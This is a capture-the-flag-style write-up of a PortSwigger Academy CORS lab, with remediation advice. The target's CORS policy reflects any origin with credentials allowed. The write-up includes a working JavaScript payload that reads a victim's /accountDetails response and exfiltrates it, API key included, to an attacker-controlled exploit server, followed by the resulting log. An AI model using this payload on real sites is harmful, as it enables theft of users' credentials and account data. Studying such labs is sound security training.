# 🪞 CORS Origin Reflection — Admin API Key Exfiltration

![Vuln](https://img.shields.io/badge/vuln-CORS%20Misconfiguration-red)
![Severity](https://img.shields.io/badge/severity-high-orange)
![Platform](https://img.shields.io/badge/platform-PortSwigger%20Academy-blue)
![Status](https://img.shields.io/badge/status-solved-success)

A walkthrough of PortSwigger Web Security Academy's **"CORS vulnerability with basic origin reflection"** lab — exploiting a misconfigured CORS policy that reflects any requesting `Origin` back with credentialed access enabled, allowing an attacker-controlled page to read an authenticated victim's private API response.

## Summary

The application trusts arbitrary origins and allows credentialed cross-origin requests, letting attacker-controlled JavaScript read sensitive authenticated data from a victim's account. The lab objective: retrieve the administrator's API key using CORS and submit it as proof of exploitation.

## Lab Environment

| Component | Value |
|---|---|
| Lab | CORS vulnerability with basic origin reflection |
| Platform | PortSwigger Web Security Academy |
| Vulnerable endpoint | `/accountDetails` |
| Delivery mechanism | PortSwigger exploit server |

> Lab instance and exploit-server URLs are ephemeral — PortSwigger provisions a unique subdomain per session and tears it down afterward, so no live URLs are included here.

## Vulnerability

The `/accountDetails` endpoint returns sensitive account data for the currently authenticated user. Because the CORS policy reflects (or otherwise trusts) the requesting `Origin` header while also allowing credentials, a malicious page hosted on a completely different origin can issue a cross-origin request using the victim's session cookies — and read the response.

This defeats the Same-Origin Policy protection that should normally stop one website from reading authenticated responses belonging to another.

## Exploit Payload

Hosted on the attacker-controlled exploit server:

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get', 'https://TARGET-LAB-HOST/accountDetails', true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location = 'https://EXPLOIT-SERVER-HOST/log?key=' + this.responseText;
  }
</script>
```

## Exploitation Flow

1. Malicious JavaScript saved on the exploit server.
2. Exploit delivered to the victim (simulated admin) via the lab's "deliver exploit to victim" action.
3. Victim's browser loads the exploit page.
4. Script sends a credentialed request to `/accountDetails`.
5. The vulnerable CORS configuration allows the exploit page to read the response.
6. Response is exfiltrated to the exploit server's access log via the `/log?key=` parameter.
7. Administrator's API key is extracted from the logged JSON.

## Evidence

Exploit server access log showing the exfiltrated response:

```
10.0.4.220 [REDACTED_TIMESTAMP]
GET /log?key={
  "username": "administrator",
  "email": "",
  "apikey": "<REDACTED_API_KEY>",
  "sessions": [
    "<REDACTED_SESSION_TOKEN>"
  ]
}
```

User-agent confirming the request originated from the victim's browser:

```
Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

Submitting the recovered API key marked the lab as solved.

> Key and session values above are redacted — they belonged to a per-session, now-expired lab instance, but are blanked out as good practice rather than left looking like live credentials.

## Impact

An attacker able to lure a victim to a malicious page can silently steal sensitive account data — in this case, an administrator's API key. In a production application, this class of bug can lead to full account takeover, unauthorized API access, or exposure of private user data at scale.

## Root Cause

An insecure CORS configuration that reflects/trusts arbitrary `Origin` headers while allowing `Access-Control-Allow-Credentials: true`. A secure application should never combine credentialed responses with an untrusted, reflected origin.

## Remediation

- Use a strict allowlist of trusted origins — never reflect the incoming `Origin` header verbatim.
- Never pair `Access-Control-Allow-Credentials: true` with an untrusted or wildcard origin.
- Keep sensitive endpoints (like `/accountDetails`) same-origin only where cross-origin access isn't a genuine business requirement.
- Avoid exposing secrets such as API keys in browser-accessible API responses unless strictly necessary.

## References

- [PortSwigger — CORS vulnerabilities](https://portswigger.net/web-security/cors)
- [MDN — Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

<p align="center">
  <sub>Write-up by <strong>Sepehr Abolhasan</strong> · Lab: PortSwigger Web Security Academy · For educational purposes on a public training platform</sub>
</p>
